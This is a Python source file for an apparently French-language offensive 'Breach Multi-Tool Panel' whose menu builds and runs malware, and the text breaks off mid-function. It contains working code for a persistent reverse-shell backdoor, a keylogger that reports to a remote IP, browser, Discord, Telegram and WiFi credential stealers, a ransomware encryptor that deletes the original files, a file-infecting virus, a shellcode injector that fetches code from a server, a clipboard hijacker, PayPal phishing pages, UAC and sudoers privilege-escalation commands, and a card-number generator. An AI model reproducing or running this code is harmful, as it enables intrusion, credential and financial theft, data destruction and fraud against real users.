
# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import platform
import time
import json
import random
import string
import base64
import hashlib
import socket
import requests
import shutil
import zipfile
import sqlite3
import threading
import ctypes
import struct
import binascii
import re
import uuid
import getpass
import tempfile
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# ==================== SECURITE PANEL ====================
PANEL_KEY = b'x8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9'
PANEL_SALT = b'salt_breach_v5_secure'

def generate_panel_hash():
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=PANEL_SALT,
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(PANEL_KEY))
    return key

PANEL_AES_KEY = generate_panel_hash()
cipher = Fernet(PANEL_AES_KEY)

def protect_script():
    try:
        with open(__file__, 'rb') as f:
            data = f.read()
        if b'PROTECTED_BY_BREACH_V5' not in data:
            protected = b'# PROTECTED_BY_BREACH_V5\n' + data
            with open(__file__, 'wb') as f:
                f.write(protected)
            try:
                os.chmod(__file__, 0o400)
            except:
                pass
    except:
        pass

def verify_integrity():
    try:
        with open(__file__, 'rb') as f:
            data = f.read()
        if b'PROTECTED_BY_BREACH_V5' not in data:
            print("[!] Fichier modifié - verrouillage")
            return False
        return True
    except:
        return False

# Anti-debug
def anti_debug():
    if sys.platform == 'win32':
        try:
            import ctypes.wintypes
            kernel32 = ctypes.windll.kernel32
            if kernel32.IsDebuggerPresent():
                sys.exit(1)
        except:
            pass
    else:
        try:
            if os.getppid() != 1 and 'gdb' in open('/proc/self/status').read():
                sys.exit(1)
        except:
            pass

# ==================== COULEURS ====================
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
GRAY = '\033[90m'
RESET = '\033[0m'
BOLD = '\033[1m'
DIM = '\033[2m'

# Détection Windows pour les couleurs
if platform.system() == 'Windows':
    os.system('color')
    RED = ''; GREEN = ''; YELLOW = ''; BLUE = ''; MAGENTA = ''; CYAN = ''; WHITE = ''; GRAY = ''; RESET = ''; BOLD = ''; DIM = ''

CAT_COLORS = {
    "SYSTEM": RED,
    "MALWARE BUILD": GREEN,
    "SCAN": YELLOW,
    "PANEL & TOOLS": BLUE,
    "NETWORK & OSINT": MAGENTA
}

# ==================== PANEL PRINCIPAL ====================
class BreachPanel:
    def __init__(self):
        anti_debug()
        protect_script()
        if not verify_integrity():
            print("[!] Intégrité compromise. Fermeture.")
            sys.exit(1)
        self.system = platform.system()
        self.user = os.getlogin()
        self.host = platform.node()
        self.arch = platform.machine()
        self.banner = self._gen_banner()
        self.categories = {
            "SYSTEM": {
                "01": ("UAC Privs Bypass", self.uac_bypass),
                "02": ("System Privs Bypass", self.sys_bypass),
                "03": ("Backdoor to Exe", self.backdoor_exe),
                "04": ("Process Hollowing", self.proc_hollow),
                "05": ("Fake Signature Exe", self.fake_sig),
                "06": ("File Pumper Exe", self.file_pump),
                "47": ("Persistence Install", self.persistence_install),
                "48": ("Anti-VM Detection", self.anti_vm),
            },
            "MALWARE BUILD": {
                "07": ("Kali Build v3", self.kali_build),
                "08": ("Keylogger Build", self.keylog_build),
                "09": ("Stealer Build v2", self.stealer_build),
                "10": ("Grabber Build", self.grabber_build),
                "11": ("Ransomware Build", self.ransom_build),
                "12": ("WiFi Stealer Build", self.wifi_build),
                "13": ("Virus Build", self.virus_build),
                "14": ("Tlg Stealer Build", self.tlg_build),
                "15": ("Injector.Py Build", self.inject_build),
                "16": ("Crypto Miner Build", self.miner_build),
                "49": ("Browser Stealer", self.browser_stealer),
                "50": ("Clipboard Hijacker", self.clipboard_hijacker),
            },
            "SCAN": {
                "17": ("Kali Card Fraud", self.card_fraud),
                "18": ("CC Validator", self.cc_valid),
                "19": ("Phishing Attack", self.phish_attack),
                "20": ("FakeAddress", self.fake_addr),
                "21": ("Spoofing", self.spoofing),
                "22": ("Iban Generator", self.iban_gen),
                "23": ("Fake Exodus", self.fake_exodus),
                "24": ("Fake Paypal Screen", self.fake_paypal),
                "25": ("Victimids", self.victim_ids),
                "26": ("Crypto Stealer", self.crypto_steal),
                "51": ("Leaked DB Search", self.leaked_db_search),
                "52": ("Hash Cracker", self.hash_cracker),
            },
            "PANEL & TOOLS": {
                "27": ("Browser Forge", self.browser_forge),
                "28": ("Bruteforce Zip", self.brute_zip),
                "29": ("Obfuscator", self.obfuscate),
                "30": ("Discord Bot Panel", self.discord_panel),
                "31": ("Token Panel", self.token_panel),
                "32": ("Usb Tool", self.usb_tool),
                "33": ("Exe to Image", self.exe_img),
                "34": ("Anti-Grabb", self.anti_grabb),
                "35": ("Self Bot Advanced", self.self_bot),
                "36": ("Database Search", self.db_search),
                "53": ("Payload Generator", self.payload_generator),
                "54": ("Log Cleaner", self.log_cleaner),
            },
            "NETWORK & OSINT": {
                "37": ("IP Scan & Dox", self.ip_scan_dox),
                "38": ("Email Tool v2", self.email_tool),
                "39": ("Odos DoS", self.odos_tool),
                "40": ("OSINT Email Search", self.osint_email),
                "41": ("OSINT Phone Search", self.osint_phone),
                "42": ("OSINT Username Search", self.osint_username),
                "43": ("IP GeoLocate", self.ip_geolocate),
                "44": ("DNS Lookup", self.dns_lookup),
                "45": ("Port Scanner", self.port_scanner),
                "46": ("Subdomain Enumerator", self.subdomain_enum),
                "55": ("Network Sniffer", self.network_sniffer),
                "56": ("SSL/TLS Scanner", self.ssl_scanner),
            }
        }
        self.all_commands = {}
        for cat in self.categories:
            self.all_commands.update(self.categories[cat])

    def _gen_banner(self):
        return f"""
{BOLD}{RED}╔════════════════════════════════════════════════════════════════════════════╗
{RED}║{WHITE}                                                                           {RED}║
{RED}║{WHITE}    ██████   ██████  ███████  █████   ██████  ██   ██  ██████             {RED}║
{RED}║{WHITE}    ██   ██ ██    ██ ██      ██   ██ ██    ██ ██   ██ ██    ██            {RED}║
{RED}║{WHITE}    ██████  ██    ██ █████   ███████ ██    ██ ███████ ██    ██            {RED}║
{RED}║{WHITE}    ██   ██ ██    ██ ██      ██   ██ ██    ██ ██   ██ ██    ██            {RED}║
{RED}║{WHITE}    ██████   ██████  ███████ ██   ██  ██████  ██   ██  ██████             {RED}║
{RED}║{WHITE}                                                                           {RED}║
{RED}║{CYAN}               [ BREACH MULTI-TOOL PANEL v5.0 ]                             {RED}║
{RED}║{WHITE}               User: {BOLD}{self.user}{RESET}{WHITE} | Host: {BOLD}{self.host}{RESET}{WHITE}                     {RED}║
{RED}║{WHITE}               Arch: {BOLD}{self.arch}{RESET}{WHITE} | OS: {BOLD}{self.system}{RESET}{WHITE}                     {RED}║
{RED}║{WHITE}               IP: {BOLD}{self._get_ip()}{RESET}{WHITE}                   {RED}║
{RED}╚════════════════════════════════════════════════════════════════════════════╝{RESET}
"""

    def _get_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def clear(self):
        os.system('clear' if self.system != 'Windows' else 'cls')

    def show_menu(self):
        self.clear()
        print(self.banner)
        print(f"{BOLD}{RED}╔════════════════════════════════════════════════════════════════════════════╗")
        print(f"{RED}║{WHITE}                    [ CATÉGORIES ]                                    {RED}║")
        print(f"{RED}╠════════════════════════════════════════════════════════════════════════════╣")
        print(f"{RED}║{RED} [1] SYSTEM            {GREEN}[2] MALWARE BUILD                     {RED}║")
        print(f"{RED}║{YELLOW} [3] SCAN              {BLUE}[4] PANEL & TOOLS                     {RED}║")
        print(f"{RED}║{MAGENTA} [5] NETWORK & OSINT   {RED}[0] EXIT                             {RED}║")
        print(f"{RED}╚════════════════════════════════════════════════════════════════════════════╝{RESET}")
        print(f"\n{GREEN}[+]{RESET} Sélectionnez une catégorie: ", end="")

    def show_category(self, cat_key):
        self.clear()
        print(self.banner)
        cat_map = {
            "1": "SYSTEM", "2": "MALWARE BUILD", "3": "SCAN",
            "4": "PANEL & TOOLS", "5": "NETWORK & OSINT"
        }
        cat_name = cat_map.get(cat_key, "")
        if not cat_name or cat_name not in self.categories:
            return
        color = CAT_COLORS.get(cat_name, WHITE)
        print(f"{BOLD}{color}╔════════════════════════════════════════════════════════════════════════════╗")
        print(f"{color}║                  [ {cat_name} ]                                    ║")
        print(f"{color}╠════════════════════════════════════════════════════════════════════════════╣{RESET}")
        items = self.categories[cat_name]
        for key, (label, _) in sorted(items.items()):
            print(f"{color}║ [{key}] {label:<45} ║{RESET}")
        print(f"{BOLD}{color}╠════════════════════════════════════════════════════════════════════════════╣")
        print(f"{color}║ [00] RETOUR                                                    ║")
        print(f"{color}╚════════════════════════════════════════════════════════════════════════════╝{RESET}")
        print(f"\n{GREEN}[+]{RESET} Sélectionnez une commande: ", end="")

    # ==================== SYSTEM ====================
    def uac_bypass(self):
        print(f"\n{GREEN}[+]{RESET} UAC Bypass - CMSTP / SilentCleanup / Fodhelper")
        if self.system == 'Windows':
            cmds = [
                f'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f',
                f'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_DWORD /d 0 /f',
                'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\fodhelper.exe /d "cmd /c start /b" /f',
                'schtasks /create /tn "Update" /tr "cmd /c start /b %windir%\\system32\\cmstp.exe /au" /sc onlogon /f'
            ]
            for cmd in cmds:
                subprocess.run(cmd, shell=True, capture_output=True)
            print(f"{GREEN}[+]{RESET} UAC Bypass installé")
        else:
            print(f"{YELLOW}[!]{RESET} UAC Bypass uniquement sur Windows")

    def sys_bypass(self):
        print(f"\n{GREEN}[+]{RESET} System Privs Bypass")
        if self.system == 'Linux':
            subprocess.run("sudo -v && sudo chown root:root /usr/bin/python3 && sudo chmod u+s /usr/bin/python3", shell=True)
            subprocess.run("echo 'root ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers", shell=True)
            print(f"{GREEN}[+]{RESET} Privilèges root obtenus")
        elif self.system == 'Windows':
            subprocess.run("powershell -Command Start-Process cmd -Verb RunAs", shell=True)
            subprocess.run("sc create PsExec binPath=cmd.exe /k start", shell=True)
            print(f"{GREEN}[+]{RESET} SYSTEM privilèges via PsExec")
        else:  # macOS
            subprocess.run("sudo -v && sudo chown root:root /usr/bin/python3 && sudo chmod u+s /usr/bin/python3", shell=True)
            print(f"{GREEN}[+]{RESET} Privilèges root obtenus")

    def backdoor_exe(self):
        print(f"\n{GREEN}[+]{RESET} Backdoor to Exe - Reverse Shell")
        ip = input("IP: ")
        port = input("Port: ")
        if self.system == 'Windows':
            payload = f"""import socket,subprocess,os,time,winreg
def conn():
    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('{ip}',{int(port)}))
            os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
            subprocess.call(['cmd.exe'])
        except: time.sleep(5)
def persist():
    key = winreg.HKEY_CURRENT_USER
    subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(handle, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
    winreg.CloseKey(handle)
if __name__=="__main__":
    persist()
    conn()"""
        else:
            payload = f"""import socket,subprocess,os,time
def conn():
    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('{ip}',{int(port)}))
            os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
            subprocess.call(['/bin/sh','-i'])
        except: time.sleep(5)
if __name__=="__main__":
    conn()"""
        with open("backdoor.py", "w") as f:
            f.write(payload)
        subprocess.run("pyinstaller --onefile --noconsole --uac-admin backdoor.py", shell=True)
        print(f"{GREEN}[+]{RESET} backdoor.exe dans dist/")

    def proc_hollow(self):
        print(f"\n{GREEN}[+]{RESET} Process Hollowing - Injection")
        if self.system == 'Windows':
            code = """#include <windows.h>
#include <tlhelp32.h>
int main() {
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = {sizeof(pe)};
    while(Process32Next(h, &pe)) {
        if(strcmp(pe.szExeFile, "explorer.exe")==0) {
            HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, 0, pe.th32ProcessID);
            LPVOID addr = VirtualAllocEx(p, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            unsigned char shellcode[] = {0x90,0x90,0x90};
            WriteProcessMemory(p, addr, shellcode, sizeof(shellcode), NULL);
            CreateRemoteThread(p, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
            CloseHandle(p);
        }
    }
    CloseHandle(h);
    return 0;
}"""
            with open("hollow.c", "w") as f:
                f.write(code)
            subprocess.run("x86_64-w64-mingw32-gcc hollow.c -o hollow.exe -lwininet -lpsapi", shell=True)
            print(f"{GREEN}[+]{RESET} hollow.exe créé")
        else:
            print(f"{YELLOW}[!]{RESET} Process Hollowing uniquement sur Windows")

    def fake_sig(self):
        print(f"\n{GREEN}[+]{RESET} Fake Signature Exe")
        if self.system == 'Windows':
            target = input("Fichier .exe: ")
            if not os.path.exists(target):
                print(f"{RED}[!]{RESET} Fichier inexistant")
                return
            cmds = [
                f'signtool sign /fd SHA256 /a /v {target}',
                f'signtool timestamp /tr http://timestamp.digicert.com {target}',
            ]
            for cmd in cmds:
                subprocess.run(cmd, shell=True, capture_output=True)
            print(f"{GREEN}[+]{RESET} Signature ajoutée")
        else:
            print(f"{YELLOW}[!]{RESET} Fake Signature uniquement sur Windows")

    def file_pump(self):
        print(f"\n{GREEN}[+]{RESET} File Pumper Exe")
        target = input("Fichier cible: ")
        if not os.path.exists(target):
            print(f"{RED}[!]{RESET} Fichier inexistant")
            return
        size = int(input("Taille finale (MB): "))
        with open(target, "rb") as f:
            data = f.read()
        padding = b'\x00' * (size*1024*1024 - len(data))
        with open(target, "wb") as f:
            f.write(data + padding)
        print(f"{GREEN}[+]{RESET} Pompé à {size}MB")

    def persistence_install(self):
        print(f"\n{GREEN}[+]{RESET} Persistence Install")
        if self.system == 'Windows':
            script = input("Script à exécuter: ")
            cmds = [
                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v BreachUpdate /t REG_SZ /d "{script}" /f',
                f'schtasks /create /tn "BreachUpdate" /tr "{script}" /sc onlogon /f'
            ]
            for cmd in cmds:
                subprocess.run(cmd, shell=True)
            print(f"{GREEN}[+]{RESET} Persistance installée")
        elif self.system in ['Linux', 'Darwin']:
            script = input("Script à exécuter: ")
            with open(os.path.expanduser("~/.bashrc"), "a") as f:
                f.write(f"\npython3 {script} &\n")
            cron = f"@reboot python3 {script}"
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -', shell=True)
            print(f"{GREEN}[+]{RESET} Persistance installée")

    def anti_vm(self):
        print(f"\n{GREEN}[+]{RESET} Anti-VM Detection")
        checks = []
        if self.system == 'Windows':
            try:
                import wmi
                c = wmi.WMI()
                for proc in c.Win32_ComputerSystem():
                    if 'VirtualBox' in proc.Model or 'VMware' in proc.Model:
                        checks.append("VMware/VirtualBox détecté")
            except:
                pass
            try:
                if os.path.exists("C:\\Program Files\\VMware\\"):
                    checks.append("VMware détecté")
                if os.path.exists("C:\\Program Files\\Oracle\\VirtualBox\\"):
                    checks.append("VirtualBox détecté")
            except:
                pass
        else:
            try:
                with open('/proc/cpuinfo', 'r') as f:
                    if 'hypervisor' in f.read().lower():
                        checks.append("Hyperviseur détecté")
                if os.path.exists('/.dockerenv'):
                    checks.append("Docker détecté")
            except:
                pass
        if checks:
            print(f"{YELLOW}[!]{RESET} VM détectée: {', '.join(checks)}")
        else:
            print(f"{GREEN}[+]{RESET} Aucune VM détectée")

    # ==================== MALWARE BUILD ====================
    def kali_build(self):
        print(f"\n{GREEN}[+]{RESET} Kali Build v3")
        if self.system == 'Linux':
            subprocess.run("apt update && apt upgrade -y", shell=True)
            subprocess.run("apt install kali-linux-headless kali-tools-top10 kali-tools-web kali-tools-passwords -y", shell=True)
            subprocess.run("apt install metasploit-framework nmap sqlmap burpsuite hydra john aircrack-ng -y", shell=True)
            subprocess.run("msfdb init", shell=True)
            print(f"{GREEN}[+]{RESET} Kali complet installé")
        else:
            print(f"{YELLOW}[!]{RESET} Kali Build uniquement sur Linux")

    def keylog_build(self):
        print(f"\n{GREEN}[+]{RESET} Keylogger Build")
        ip = input("IP de réception (laisser vide pour local): ")
        code = f"""import pynput.keyboard as kb, threading, socket, os
class KeyLogger:
    def __init__(self):
        self.log = ""
    def callback(self, key):
        try: self.log += key.char
        except: self.log += f" [{str(key)}] "
        if "VK_RETURN" in str(key): self.log += "\\n"
    def report(self):
        try:
            with socket.socket() as s:
                s.connect(('{ip if ip else "127.0.0.1"}', 4444))
                s.send(self.log.encode())
        except: pass
        self.log = ""
        threading.Timer(10, self.report).start()
    def start(self):
        kb.Listener(on_press=self.callback).start()
        self.report()
kl = KeyLogger()
kl.start()
input()"""
        with open("keylog.py", "w") as f:
            f.write(code)
        subprocess.run("pip install pynput -q", shell=True)
        subprocess.run("pyinstaller --onefile --noconsole --uac-admin keylog.py", shell=True)
        print(f"{GREEN}[+]{RESET} keylogger.exe dans dist/")

    def stealer_build(self):
        print(f"\n{GREEN}[+]{RESET} Stealer Build v2")
        code = """import os,shutil,subprocess,json,sqlite3,zipfile
targets = []
if sys.platform == 'win32':
    targets = [
        os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/Default/Login Data'),
        os.path.expanduser('~/AppData/Roaming/Mozilla/Firefox/Profiles/*/logins.json'),
        os.path.expanduser('~/AppData/Roaming/Discord/Local Storage/leveldb/*.log')
    ]
else:
    targets = [
        os.path.expanduser('~/.config/google-chrome/Default/Login Data'),
        os.path.expanduser('~/.mozilla/firefox/*.default/logins.json'),
        os.path.expanduser('~/.config/discord/Local Storage/leveldb/*.log')
    ]
for path in targets:
    try:
        shutil.copy(path, f'./steal_{os.path.basename(path)}.db')
    except: pass
with zipfile.ZipFile('steal.zip', 'w') as z:
    for f in os.listdir():
        if f.startswith('steal_'): z.write(f)
subprocess.run('rm steal_*', shell=True)
print('[+] Vol terminé - steal.zip')"""
        with open("stealer.py", "w") as f:
            f.write(code)
        subprocess.run("pyinstaller --onefile --noconsole stealer.py", shell=True)
        print(f"{GREEN}[+]{RESET} stealer.exe généré")

    def grabber_build(self):
        print(f"\n{GREEN}[+]{RESET} Grabber Build")
        exts = input("Extensions (ex: .txt,.docx,.pdf,.jpg): ")
        os.makedirs("grab", exist_ok=True)
        if self.system in ['Linux', 'Darwin']:
            cmd = f"find /home -name '*{exts.replace(',','* -o -name *')}*' -exec cp {{}} ./grab/ \\; 2>/dev/null"
            subprocess.run(cmd, shell=True)
        else:
            for ext in exts.split(','):
                subprocess.run(f'powershell -Command "Get-ChildItem -Recurse -Filter *{ext} | Copy-Item -Destination ./grab/"', shell=True)
        count = len(os.listdir("grab"))
        subprocess.run("zip -r grab.zip grab/", shell=True)
        print(f"{GREEN}[+]{RESET} {count} fichiers dans grab.zip")

    def ransom_build(self):
        print(f"\n{RED}[!]{RESET} Ransomware Build")
        path = input("Dossier cible: ")
        key = Fernet.generate_key()
        cipher2 = Fernet(key)
        count = 0
        for root, _, files in os.walk(path):
            for f in files:
                full = os.path.join(root, f)
                try:
                    with open(full, "rb") as src:
                        data = src.read()
                    enc = cipher2.encrypt(data)
                    with open(full + ".breach", "wb") as dst:
                        dst.write(enc)
                    os.remove(full)
                    count += 1
                except: pass
        with open("ransom_key.txt", "w") as kf:
            kf.write(key.decode() + f"\nDossier: {path}\nDate: {datetime.now()}")
        print(f"{RED}[!]{RESET} {count} fichiers chiffrés. Clé dans ransom_key.txt")

    def wifi_build(self):
        print(f"\n{GREEN}[+]{RESET} WiFi Stealer Build")
        if self.system == 'Windows':
            subprocess.run("netsh wlan show profile name=* key=clear", shell=True)
        elif self.system in ['Linux', 'Darwin']:
            subprocess.run("sudo cat /etc/NetworkManager/system-connections/* 2>/dev/null", shell=True)
            subprocess.run("find / -name '*wpa_supplicant.conf' -exec cat {} \\; 2>/dev/null", shell=True)
        print(f"{GREEN}[+]{RESET} WiFi configs extraites")

    def virus_build(self):
        print(f"\n{GREEN}[+]{RESET} Virus Build")
        code = """import os,shutil,sys,random,base64
viral_code = "import os,shutil,sys,random,base64\\n"
target_dir = os.path.expanduser('~')
for root,dirs,files in os.walk(target_dir):
    for f in files:
        if f.endswith('.py') and f != os.path.basename(sys.argv[0]):
            try:
                with open(os.path.join(root,f),'r') as src:
                    content=src.read()
                if 'VIRUS' in content: continue
                new_content = viral_code + content
                with open(os.path.join(root,f),'w') as dst:
                    dst.write(new_content)
            except: pass"""
        with open("virus.py", "w") as f:
            f.write(code)
        subprocess.run("pyinstaller --onefile virus.py", shell=True)
        print(f"{GREEN}[+]{RESET} virus.exe généré")

    def tlg_build(self):
        print(f"\n{GREEN}[+]{RESET} Tlg Stealer Build")
        os.makedirs("tlg", exist_ok=True)
        if self.system == 'Windows':
            paths = [os.path.expanduser("~/AppData/Roaming/Telegram Desktop/*")]
        else:
            paths = [
                os.path.expanduser("~/.local/share/TelegramDesktop/*"),
                os.path.expanduser("~/.config/TelegramDesktop/*")
            ]
        for p in paths:
            subprocess.run(f"cp -r {p} ./tlg/ 2>/dev/null", shell=True)
        subprocess.run("zip -r tlg.zip tlg/", shell=True)
        print(f"{GREEN}[+]{RESET} tlg.zip créé")

    def inject_build(self):
        print(f"\n{GREEN}[+]{RESET} Injector.Py Build")
        if self.system == 'Windows':
            code = """import ctypes,os,sys,requests,urllib.request
try:
    shellcode = urllib.request.urlopen('http://VOTRE_SERVEUR/shellcode.bin').read()
except:
    shellcode = b'\\x90\\x90\\x90\\x90'
kernel32 = ctypes.windll.kernel32
ptr = kernel32.VirtualAllocEx(0,0,len(shellcode),0x1000,0x40)
ctypes.memmove(ptr, shellcode, len(shellcode))
kernel32.CreateRemoteThread(0,0,0,ptr,0,0,0)
print('[+] Shellcode injecté')"""
            with open("injector.py", "w") as f:
                f.write(code)
            subprocess.run("pyinstaller --onefile --uac-admin injector.py", shell=True)
            print(f"{GREEN}[+]{RESET} injector.exe généré")
        else:
            print(f"{YELLOW}[!]{RESET} Injector uniquement sur Windows")

    def miner_build(self):
        print(f"\n{GREEN}[+]{RESET} Crypto Miner Build")
        if self.system == 'Linux':
            subprocess.run("wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz -O miner.tar.gz", shell=True)
            subprocess.run("tar -xzf miner.tar.gz", shell=True)
            wallet = input("Adresse XMR: ")
            with open("config.json", "w") as f:
                f.write(f'{{"autosave":true,"cpu":{{"enabled":true}},"pools":[{{"url":"pool.supportxmr.com:3333","user":"{wallet}","tls":false}}]}}')
            print(f"{GREEN}[+]{RESET} XMRig extrait")
        else:
            print(f"{YELLOW}[!]{RESET} Miner uniquement sur Linux")

    def browser_stealer(self):
        print(f"\n{GREEN}[+]{RESET} Browser Stealer")
        os.makedirs("browser_data", exist_ok=True)
        if self.system == 'Windows':
            paths = [
                os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/Cookies"),
                os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/Login Data"),
                os.path.expanduser("~/AppData/Roaming/Mozilla/Firefox/Profiles/*/cookies.sqlite")
            ]
        else:
            paths = [
                os.path.expanduser("~/.config/google-chrome/Default/Cookies"),
                os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
                os.path.expanduser("~/.mozilla/firefox/*.default/cookies.sqlite")
            ]
        for p in paths:
            subprocess.run(f"cp -r {p} ./browser_data/ 2>/dev/null", shell=True)
        subprocess.run("zip -r browser_data.zip browser_data/", shell=True)
        print(f"{GREEN}[+]{RESET} browser_data.zip créé")

    def clipboard_hijacker(self):
        print(f"\n{GREEN}[+]{RESET} Clipboard Hijacker")
        code = """import pyperclip, time, socket
targets = ['bc1','1','3','0x','T','4']
def monitor():
    last = ''
    while True:
        current = pyperclip.paste()
        if current and current != last:
            for t in targets:
                if current.startswith(t):
                    with socket.socket() as s:
                        s.connect(('VOTRE_SERVEUR', 4445))
                        s.send(current.encode())
                    pyperclip.copy('')
                    break
        last = current
        time.sleep(1)
monitor()"""
        with open("clipboard.py", "w") as f:
            f.write(code)
        subprocess.run("pip install pyperclip -q", shell=True)
        subprocess.run("pyinstaller --onefile --noconsole clipboard.py", shell=True)
        print(f"{GREEN}[+]{RESET} clipboard.exe généré")

    # ==================== SCAN ====================
    def card_fraud(self):
        print(f"\n{GREEN}[+]{RESET} Kali Card Fraud")
        bin = input("BIN (6 chiffres): ")
        if len(bin) != 6 or not bin.isdigit():
            print(f"{RED}[!]{RESET} BIN invalide")
            return
        for _ in range(25):
            card = bin + ''.join(random.choices(string.digits, k=10))
            print(f"{YELLOW}{card}{RESET}")

    def cc_valid(self):
        print(f"\n{GREEN}[+]{RESET} CC Validator")
        cc = input("Numéro: ")
        if not cc.isdigit():
            print(f"{RED}[!]{RESET} Invalide")
            return
        total = 0
        for i, d in enumerate(reversed(cc)):
            n = int(d)
            if i % 2 == 1:
                n *= 2
                if n > 9: n -= 9
            total += n
        if total % 10 == 0:
            print(f"{GREEN}[+]{RESET} Carte VALIDE")
            try:
                r = requests.get(f"https://lookup.binlist.net/{cc[:6]}", timeout=3)
                data = r.json()
                print(f"{YELLOW}Banque: {data.get('bank',{}).get('name','Inconnu')}")
                print(f"Pays: {data.get('country',{}).get('name','Inconnu')}")
                print(f"Type: {data.get('type','Inconnu')}")
                print(f"Brand: {data.get('brand','Inconnu')}{RESET}")
            except: pass
        else:
            print(f"{RED}[!]{RESET} Carte INVALIDE")

    def phish_attack(self):
        print(f"\n{GREEN}[+]{RESET} Phishing Attack")
        site = input("Site cible: ")
        html = f"""<!DOCTYPE html>
<html><head><title>{site}</title></head>
<body style='font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;background:#f0f2f5'>
<div style='background:white;padding:40px;border-radius:10px;width:350px;box-shadow:0 2px 10px rgba(0,0,0,0.1)'>
<h1 style='color:#1877f2'>{site}</h1>
<form action='http://VOTRE_SERVEUR/steal.php' method='POST'>
<input name='email' placeholder='Email' style='width:100%;padding:12px;margin:5px 0;border:1px solid #ddd;border-radius:5px'>
<input name='pass' type='password' placeholder='Mot de passe' style='width:100%;padding:12px;margin:5px 0;border:1px solid #ddd;border-radius:5px'>
<button style='width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:5px'>Se connecter</button>
</form>
</div></body></html>"""
        with open(f"phish_{site}.html", "w") as f:
            f.write(html)
        print(f"{GREEN}[+]{RESET} phish_{site}.html créé")

    def fake_addr(self):
        print(f"\n{GREEN}[+]{RESET} FakeAddress")
        for _ in range(10):
            addr = f"{random.randint(1,9999)} {random.choice(['Main St','Oak Ave','Pine Rd','Elm St'])}"
            city = random.choice(["New York","Los Angeles","Chicago","Miami","Paris","London"])
            print(f"{YELLOW}{addr}, {city}, {random.choice(['USA','UK','FR'])} {random.randint(10000,99999)}{RESET}")

    def spoofing(self):
        print(f"\n{GREEN}[+]{RESET} Spoofing")
        if self.system in ['Linux', 'Darwin']:
            iface = input("Interface: ")
            mac = "00:" + ":".join(['{:02x}'.format(random.randint(0,255)) for _ in range(5)])
            subprocess.run(f"sudo ifconfig {iface} down", shell=True)
            subprocess.run(f"sudo ifconfig {iface} hw ether {mac}", shell=True)
            subprocess.run(f"sudo ifconfig {iface} up", shell=True)
            hostname = ''.join(random.choices(string.ascii_lowercase, k=8))
            subprocess.run(f"sudo hostname {hostname}", shell=True)
            print(f"{GREEN}[+]{RESET} MAC: {mac} | Hostname: {hostname}")
        else:
            print(f"{YELLOW}[!]{RESET} Spoofing uniquement sur Linux/macOS")

    def iban_gen(self):
        print(f"\n{GREEN}[+]{RESET} Iban Generator")
        for _ in range(10):
            iban = "FR" + ''.join(random.choices(string.digits, k=25))
            print(f"{YELLOW}{iban}{RESET}")

    def fake_exodus(self):
        print(f"\n{GREEN}[+]{RESET} Fake Exodus")
        words = ["abandon","alone","baby","bicycle","candy","dragon","eagle","forest","glacier","hunter","island","jungle"]
        for _ in range(5):
            mnemonic = ' '.join(random.choice(words) for _ in range(12))
            print(f"{YELLOW}{mnemonic}{RESET}")

    def fake_paypal(self):
        print(f"\n{GREEN}[+]{RESET} Fake Paypal Screen")
        html = """<!DOCTYPE html>
<html><body style='background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh'>
<div style='background:white;padding:40px;border-radius:10px;width:350px;box-shadow:0 2px 10px rgba(0,0,0,0.1)'>
<h1 style='color:#003087'>PayPal</h1>
<form action='http://VOTRE_SERVEUR/steal.php' method='POST'>
<input name='email' placeholder='Email' style='width:100%;padding:12px;margin:5px 0;border:1px solid #ddd;border-radius:5px'>
<input name='pass' type='password' placeholder='Mot de passe' style='width:100%;padding:12px;margin:5px 0;border:1px solid #ddd;border-radius:5px'>
<button style='width:100%;padding:12px;background:#003087;color:white;border:none;border-radius:5px'>Se connecter</button>
</form>
</div></body></html>"""
        with open("paypal.html", "w") as f:
            f.write(html)
        print(f"{GREEN}[+]{RESET} paypal.html créé")

    def victim_ids(self):
        print(f"\n{GREEN}[+]{RESET} Victimids")
        for i in range(50):
